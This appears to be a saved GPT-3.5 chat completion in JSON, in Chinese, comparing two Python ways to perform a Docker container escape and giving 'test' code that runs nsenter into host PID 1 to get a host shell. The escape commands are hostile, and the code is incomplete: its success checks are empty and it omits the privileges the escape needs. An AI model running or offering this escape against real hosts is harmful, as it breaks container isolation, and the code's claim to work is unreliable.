@@ -1,0 +1,23 @@
+{
+  "id":"chatcmpl-8WbwOj9cD6TXKlgzV8Qg7E222mIM5",
+  "object":"chat.completion",
+  "created":1702783032,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[TTPs - Docker容器越獄]\n\n[方案一總結]\n使用套件：docker\n優點：透過docker模組能夠方便地管理和運行Docker容器，並提供高級功能和控制。\n缺點：需要額外安裝和配置Docker環境。\n\n[方案二總結]\n使用套件：os\n優點：使用os模組能夠直接執行操作系統命令，無需額外安裝和配置。\n缺點：對於初學者可能不太友好，需要對操作系統命令和語法有一定了解。\n\n功能測試：\n為方案一和方案二分別撰寫以下功能測試程式碼：\n\n方案一功能測試程式碼：\n```python\nimport docker\n\ndef test_escape_to_host_with_docker_package():\n    client = docker.from_env()\n    \n    # 創建一個新的Docker容器\n    container = client.containers.run('alpine', detach=True, tty=True)\n    \n    # 在容器中執行命令以越獄到主機\n    container.exec_run('nsenter -t 1 -m -u -i -n sh')\n    \n    # 確認越獄是否成功\n    \n    # 刪除容器\n    container.remove()\n```\n\n方案二功能測試程式碼：\n```python\nimport os\n\ndef test_escape_to_host_with_os_package():\n    # 執行 Docker 命令以創建一個新的容器\n    os.system('docker run -itd --name escape_container alpine')\n    \n    # 在容器中執行命令以越獄到主機\n    os.system('docker exec -it escape_container nsenter -t 1 -m -u -i -n sh')\n    \n    # 確認越獄是否成功\n    \n    # 刪除容器\n    os.system('docker rm -f escape_container')\n```\n\n請檢查功能測試程式碼的正確性和完整性，並根據需要進行修改和擴展。"
+      },
+      "logprobs":null,
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":1325,
+    "completion_tokens":571,
+    "total_tokens":1896
+  },
+  "system_fingerprint":null
+}
